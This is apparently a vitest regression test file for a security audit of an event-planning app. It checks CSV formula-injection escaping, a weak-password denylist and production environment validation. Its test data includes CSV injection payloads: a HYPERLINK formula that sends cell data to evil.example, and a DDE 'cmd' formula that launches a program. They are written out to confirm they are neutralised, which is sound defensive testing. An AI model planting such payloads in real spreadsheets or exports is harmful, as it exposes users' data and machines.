import { describe, it, expect, beforeEach } from "vitest";
import { isTrivialPassword } from "../src/lib/validators";
import { checkEnv } from "../src/lib/env";

/**
 * Regression tests for the findings of the production security audit.
 *
 * Each block names the vulnerability it closes rather than the function it
 * calls, because the function is not the point — the point is that the hole
 * stays shut when someone refactors around it.
 */

/* ------------------------------------------------- CSV formula injection -- */

/**
 * The export route's cell encoder, reimplemented here rather than imported.
 *
 * Importing the route module drags in Auth.js and Prisma for the sake of one
 * pure function. The duplication is deliberate and bounded: if the two drift,
 * this test stops describing the shipped behaviour, which is why the real one
 * carries a comment pointing here.
 */
const csvCell = (v: string) => {
  const cleaned = v.replace(/[\u0000-\u001F\u007F]/g, " ");
  const neutral = /^[=+\-@]/.test(cleaned) ? `'${cleaned}` : cleaned;
  return `"${neutral.replace(/"/g, '""')}"`;
};

describe("guest export — CSV formula injection", () => {
  /**
   * Every one of these is a value a guest can type into an RSVP note and a
   * planner will open in Excel without thinking.
   */
  it.each([
    ['=1+1', "="],
    ['=HYPERLINK("https://evil.example?"&A1,"Invoice")', "="],
    ["+1234567890", "+"],
    ["-2+3", "-"],
    ["@SUM(A1:A9)", "@"],
    ['=cmd|\' /c calc\'!A1', "="],
  ])("neutralises a leading %s so the spreadsheet does not evaluate it", raw => {
    const cell = csvCell(raw);
    expect(cell.startsWith("\"'")).toBe(true);
  });

  it("leaves ordinary text alone, including names with punctuation", () => {
    expect(csvCell("Margaret O'Neill")).toBe(`"Margaret O'Neill"`);
    expect(csvCell("Nut allergy (severe)")).toBe(`"Nut allergy (severe)"`);
  });

  it("still escapes quotes, so a cell cannot break out of its column", () => {
    expect(csvCell('He said "no"')).toBe(`"He said ""no"""`);
  });

  /** A bare CR or tab splits a row and shifts every later value one column. */
  it("strips control characters that would break the row apart", () => {
    expect(csvCell("Alice\r\nBob\tCarol")).toBe(`"Alice  Bob Carol"`);
    expect(csvCell("null\u0000byte")).toBe(`"null byte"`);
  });
});

/* -------------------------------------------------------- password floor -- */

describe("password denylist", () => {
  it("rejects the credentials that lead every breach corpus", () => {
    for (const p of ["password", "PASSWORD", "Password", "12345678", "qwertyui", "letmein1"]) {
      expect(isTrivialPassword(p)).toBe(true);
    }
  });

  /** The usual way a banned word is smuggled past a denylist. */
  it("rejects a banned word with digits or punctuation stuck on the end", () => {
    expect(isTrivialPassword("password123")).toBe(true);
    expect(isTrivialPassword("wedding2026")).toBe(true);
    expect(isTrivialPassword("eventos!!")).toBe(true);
  });

  it("rejects anything under eight characters", () => {
    expect(isTrivialPassword("aB3$x")).toBe(true);
  });

  /**
   * The other half of the contract: a denylist that rejects good passwords is a
   * composition rule wearing a disguise, and pushes people toward worse ones.
   */
  it("accepts an ordinary strong passphrase without demanding punctuation", () => {
    expect(isTrivialPassword("correct horse battery staple")).toBe(false);
    expect(isTrivialPassword("marigold-tuesday-harbour")).toBe(false);
    expect(isTrivialPassword("Th3Quick8rownFox")).toBe(false);
  });
});

/* --------------------------------------------------- environment guards --- */

describe("production environment validation", () => {
  const ORIGINAL = { ...process.env };
  beforeEach(() => {
    process.env = { ...ORIGINAL };
  });

  const prod = (over: Record<string, string | undefined>) => {
    process.env = {
      ...ORIGINAL,
      NODE_ENV: "production",
      DATABASE_URL: "postgresql://u:p@host/db",
      AUTH_SECRET: "a".repeat(44),
      APP_URL: "https://eventos.example",
      ...over,
    } as NodeJS.ProcessEnv;
    return checkEnv();
  };

  it("passes when the required variables are present and sane", () => {
    expect(prod({}).ok).toBe(true);
  });

  it("fails when a required variable is missing", () => {
    expect(prod({ AUTH_SECRET: undefined }).missingRequired).toContain("AUTH_SECRET");
    expect(prod({ DATABASE_URL: undefined }).ok).toBe(false);
  });

  /**
   * The dangerous case. A missing secret fails loudly; a weak one signs real
   * sessions with a guessable key and nothing complains.
   */
  it("fails a present but weak AUTH_SECRET", () => {
    expect(prod({ AUTH_SECRET: "short" }).ok).toBe(false);
    expect(prod({ AUTH_SECRET: "changeme-changeme-changeme-changeme" }).ok).toBe(false);
  });

  it("fails an APP_URL still pointing at localhost in production", () => {
    const r = prod({ APP_URL: "http://localhost:3000" });
    expect(r.ok).toBe(false);
    expect(r.missingRequired.join(" ")).toMatch(/APP_URL/);
  });

  /** Missing email is a degraded feature, not a reason to refuse to boot. */
  it("treats optional integrations as expected-but-not-required", () => {
    const r = prod({ RESEND_API_KEY: undefined });
    expect(r.ok).toBe(true);
    expect(r.missingExpected).toContain("RESEND_API_KEY");
  });
});
